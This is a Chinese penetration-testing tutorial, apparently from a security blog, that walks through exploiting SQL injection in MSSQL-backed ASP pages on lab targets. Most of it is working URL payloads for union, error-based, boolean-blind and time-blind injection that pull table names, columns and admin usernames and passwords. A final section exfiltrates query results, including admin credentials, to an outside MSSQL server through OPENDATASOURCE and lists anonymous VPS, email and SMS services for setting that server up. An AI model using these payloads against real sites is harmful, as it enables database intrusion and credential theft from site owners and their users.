---
title: MSSQL数据库注入全方位利用
tags: 
  - 数据库
  - SQL注入
  - Sql Server
categories: web安全
keywords: '数据库,web安全,mssql,sql注入'
description: MSSQL数据库注入全方位利用
cover: https://p5.ssl.qhimg.com/t0181df866952842a55.png
date: 2021-02-02 10:45:41
---

<meta name="referrer" content="no-referrer"/>

>本文由ajie原创发布
>转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/248896
>安全客 - 有思想的安全新媒体

# 0x01 前言

在渗透测试过程中遇到了MSSQL数据库，市面上也有一些文章，不过大多数讲述的都是如何快速利用注入漏洞getshell的，对于MSSQL数据库的注入漏洞没有很详细地描述。在这里我查阅了很多资料，希望在渗透测试过程中遇到了MSSQL数据库能够相对友好地进行渗透测试，文章针对实战性教学，在概念描述方面有不懂的还请自行百度，谢谢大家～

# 0x02 注入前准备

## 1、确定注入点

```php
http://219.153.49.228:40574/new_list.asp?id=2 and 1=1
```
![](https://p4.ssl.qhimg.com/t014e83f602b04a19d1.png)

```php
http://219.153.49.228:40574/new_list.asp?id=2 and 1=2
```
![](https://p0.ssl.qhimg.com/t01d16d8612cfb9ab51.png)

## 2、判断是否为mssql数据库

sysobjects为mssql数据库中独有的数据表，此处页面返回正常即可表示为mssql数据库。

```php
http://219.153.49.228:40574/new_list.asp?id=2 and (select count(*) from sysobjects)>0
```

![](https://p3.ssl.qhimg.com/t01b69ef8d50a8162d7.png)
还可以通过MSSQL数据库中的延时函数进行判断，当语句执行成功，页面延时返回即表示为MSSQL数据库。

```php
http://219.153.49.228:40574/new_list.asp?id=2;WAITFOR DELAY '00:00:10'; -- asd
```

![](https://p4.ssl.qhimg.com/t0196919ac7c368e603.png)

## 3、相关概念

### 系统自带库

MSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。
这里了解一下系统级库：
```
master：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。
model：模版数据库
tempdb：临时容器
msdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。
```
### 系统自带表

MSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表。
```
sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。
syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。
```
就如字面意思所述，id为标识，name为对应的表名和字段名，xtype为所对应的对象类型。一般我们使用两个，一个'U'为用户所创建，一个'S'为系统所创建。其他对象类型如下：
```php
对象类型：
AF = 聚合函数 (CLR)
C = CHECK 约束
D = DEFAULT（约束或独立）
F = FOREIGN KEY 约束
FN = SQL 标量函数
FS = 程序集 (CLR) 标量函数
FT = 程序集 (CLR) 表值函数
IF = SQL 内联表值函数
IT = 内部表
P = SQL 存储过程
PC = 程序集 (CLR) 存储过程
PG = 计划指南
PK = PRIMARY KEY 约束
R = 规则（旧式，独立）
RF = 复制筛选过程
S = 系统基表
SN = 同义词
SQ = 服务队列
TA = 程序集 (CLR) DML 触发器
TF = SQL 表值函数
TR = SQL DML 触发器
U = 表（用户定义类型）
UQ = UNIQUE 约束
V = 视图
X = 扩展存储过程
```

### 排序&获取下一条数据

mssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用<>或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上('')，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下：

```php
#使用<>获取数据
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name<>'id' and name<>'username'-- qwe
#使用not in获取数据
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe
```

![](https://p2.ssl.qhimg.com/t015afc1e1d3880b015.png)

### 堆叠注入

在SQL中，执行语句是通过;分割的，如果我们输入的;被数据库带入执行，那么就可以在其后加入sql执行语句，导致多条语句一起执行的注入，我们将其命名为堆叠注入。具体情况如下，很明显两条语句都进行了执行。

```php
http://192.168.150.4:9001/less-1.asp?id=1';WAITFOR DELAY '0:0:5';-- qwe
```

![](https://p5.ssl.qhimg.com/t0181df866952842a55.png)

# 0x03 显错注入

## 1、判断当前字段数

```php
http://219.153.49.228:40574/new_list.asp?id=2 order by 4
```

![](https://p5.ssl.qhimg.com/t0163e343ea44015455.png)

```php
http://219.153.49.228:40574/new_list.asp?id=2 order by 5
```

![](https://p4.ssl.qhimg.com/t015ef0881aee65eff3.png)
通过order by报错情况，可以判断出当前字段为4。

## 2、联合查询，获取显错点

1、首先因为不知道具体类型，所以还是先用null来填充字符

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,null,null,null -- qwe
```
![](https://p2.ssl.qhimg.com/t01c956d559eaff2a4a.png)
2、替换null为'null'，获取显错点

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'null','null',null -- qwe
```

![](https://p3.ssl.qhimg.com/t01661e89ccac5d5661.png)
当第一个字符设置为字符串格式时，页面报错，很明显这个就是id了，为整型字符。

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select 'null','null','null',null -- qwe
```

![](https://p5.ssl.qhimg.com/t0100837f900c3ef729.png)

## 3、通过显错点获取数据库信息

1、获取数据库版本

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select @@version),null -- qwe
```

![](https://p4.ssl.qhimg.com/t012f189779bf95f529.png)
2、查询当前数据库名称
通过轮询db_name(*)里*的内容，获取所有数据库库名

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name()),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(1)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(2)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(3)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(4)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(5)),null -- qwe
```

![](https://p5.ssl.qhimg.com/t01b48e6d8d29baefaa.png)
![](https://p4.ssl.qhimg.com/t01409617b57bcdb809.png)
3、查询当前用户

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select user),null -- qwe
```

![](https://p3.ssl.qhimg.com/t01e868a65736530e91.png)


## 4、查询表名

查询dbo.sysobjects表中用户创建的表，获取其对应的id和name

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype='U' -- qwe
```

![](https://p4.ssl.qhimg.com/t0125721234db891a35.png)
查询下一个表名

```php
#使用<>获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id <> 5575058 -- qwe#使用not in获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id not in ('5575058') -- qwe
```

![](https://p4.ssl.qhimg.com/t011661598555b1c380.png)

## 5、查询列名

这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058'-- qwe
```

![](https://p2.ssl.qhimg.com/t01c91e959dfc120a52.png)

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe
```

![](https://p0.ssl.qhimg.com/t01a8944599c209006a.png)

## 6、information_schema

值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 table_name from information_schema.tables where table_name <> 'manager'),null -- qwe
```

![](https://p1.ssl.qhimg.com/t0137da5be343f70f2e.png)

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' ),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' and column_name not in ('id','username')),null -- qwe
```

![](https://p3.ssl.qhimg.com/t01498aaac4f709b4ec.png)
![](https://p4.ssl.qhimg.com/t011d74ab2d9658c021.png)


## 7、获取数据

```php
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username <> 'admin_mz'-- qwe
```

![](https://p5.ssl.qhimg.com/t01188d69b4c3307b79.png)
解密获取密码
![](https://p2.ssl.qhimg.com/t016cb243729a0f493a.png)

# 0x04 报错注入

mssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。

## 1、直接报错

等号两边数据类型不一致配合子查询获取数据。

```php
#获取数据库库名?id=1' and 1=(select db_name()) -- qwe
```

![](https://p0.ssl.qhimg.com/t01f288e811fb1764c3.png)

```php
#获取第一个表名?id=1' and 1=(select top 1 name from dbo.sysobjects) -- qwe
```

![](https://p1.ssl.qhimg.com/t01c2dcc7214ea0790b.png)

```php
#将数据连接显示?id=1'  and 1=stuff((select db_name() for xml path('')),1,0,'')--+
```

## 2、convert()函数

```php
convert(int,db_name())，将第二个参数的值转换成第一个参数的int类型。
```

具体用法如下：

```php
#获取数据库库名?id=1' and 1=convert(int,(select db_name())) -- qwe
```

![](https://p5.ssl.qhimg.com/t0147c5729c269d0ac8.png)

```php
#获取数据库版本?id=1' and 1=convert(int,(select @@version))) -- qwe
```

![](https://p3.ssl.qhimg.com/t0171dbf58ebfd7a276.png)

## 3、cast()函数

```php
CAST(expression AS data_type)，将as前的参数以as后指定了数据类型转换。
```

具体用法如下：

```php
#查询当前数据库?id=1' and 1=(select cast(db_name() as int)) -- qe
```

![](https://p0.ssl.qhimg.com/t01df3bbcf46b69a91b.png)

```php
#查询第一个数据表?id=1' and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe
```

![](https://p0.ssl.qhimg.com/t0194b470a057b6bc45.png)

## 4、数据组合输出

```php
#将数据表组合输出?id=1' and 1=stuff((select quotename(name) from dbo.sysobjects  for xml path('')),1,0,'')--+
```

![](https://p0.ssl.qhimg.com/t0126a37aad232cde94.png)

```php
#查询users表中的用户名并组合输出?id=1'  and 1=stuff((select quotename(username) from users for xml path('')),1,0,'')--+
```

![](https://p4.ssl.qhimg.com/t01c6b6db795cf3b7df.png)

# 0x05 布尔盲注

## 1、查询数据库库名

1、查询数据库库名长度为11

```php
http://219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11
```

![](https://p1.ssl.qhimg.com/t01d1a89cb7da54caa8.png)
2、查询第一个字符的ascii码为109

```php
http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))>109
```

![](https://p5.ssl.qhimg.com/t0116e04363840e9a62.png)
![](https://p3.ssl.qhimg.com/t015abf97111fa1b9af.png)
3、查询第二个字符的ascii码为111

```php
http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111
```

![](https://p5.ssl.qhimg.com/t01e337930ebb104e75.png)
4、获取所有ascii码之后，解码获取数据
![](https://p1.ssl.qhimg.com/t011e5c21dc29f4e03b.png)

## 2、查询表名

除了像上面查询库名使用了ascii码外，还可以直接猜解字符串

```php
http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m'
```

![](https://p1.ssl.qhimg.com/t019bb4ff316062345b.png)

```php
http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,6)='manage'
```

![](https://p5.ssl.qhimg.com/t017026272920723c8d.png)

# 0x06 延时盲注

## 1、延时函数 WAITFOR DELAY

```php
语法：n表示延时几秒WAITFOR DELAY '0:0:n'id=1 if (布尔盲注的判断语句) WAITFOR DELAY '0:0:5' -- qwe
```

## 2、查询数据

```php
#判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY '0:0:5' -- qwe
```

![](https://p3.ssl.qhimg.com/t018900c2d899e6edae.png)

```php
#判断如果第一个表的表名的第一个字符为m，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m') WAITFOR DELAY '0:0:5' -- qwe
```

![](https://p3.ssl.qhimg.com/t01b7f6779fd2f33d7e.png)


# 0x07 反弹注入

就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。
反弹注入条件相对苛刻一些，需要一台搭建了mssql数据库的vps服务器，需要开启堆叠注入。
反弹注入需要使用opendatasource函数。

```php
OPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。
```

```php
申请免费云服务器：香港云：http://www.webweb.com/在线邮箱：http://24mail.chacuo.net/接码平台：https://yunduanxin.net/
```

## 1、环境准备

1、首先打开靶场
![](https://p3.ssl.qhimg.com/t0125c9c6371197c223.png)
3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。

```php
CREATE TABLE test(name VARCHAR(255))
```

![](https://p0.ssl.qhimg.com/t01202219ab5bf4ddfc.png)

## 2、获取数据库所有表

1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。

```php
#查询sysobjects表?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype='U' -- qwe#查询information_schema数据库?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe
```

2、执行成功页面返回正常。
![](https://p5.ssl.qhimg.com/t01dbe22abee44923d4.png)
3、在数据库中成功获取到数据。
![](https://p2.ssl.qhimg.com/t014a5c058780e87669.png)

## 3、获取数据库admin表中的所有列名

```php
#查询information_schema数据库?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name='admin'-- qwe#查询syscolumns表?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe
```

![](https://p0.ssl.qhimg.com/t018c0e415a5ac7d536.png)
![](https://p1.ssl.qhimg.com/t01957478eb17de4d8a.png)

## 4、获取数据

1、首先新建一个表，里面放三个字段，分别是id，username和passwd。

```php
CREATE TABLE data(id INT,username VARCHAR(255),passwd VARCHAR(255))
```

2、获取admin表中的数据

```php
?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.data select id,username,passwd from  admin -- qwe
```

![](https://p0.ssl.qhimg.com/t01b7ef0a0f00234293.png)
![](https://p4.ssl.qhimg.com/t01ce04ab44180c2881.png)

# 0x08 总结

	完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。
	
	靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～
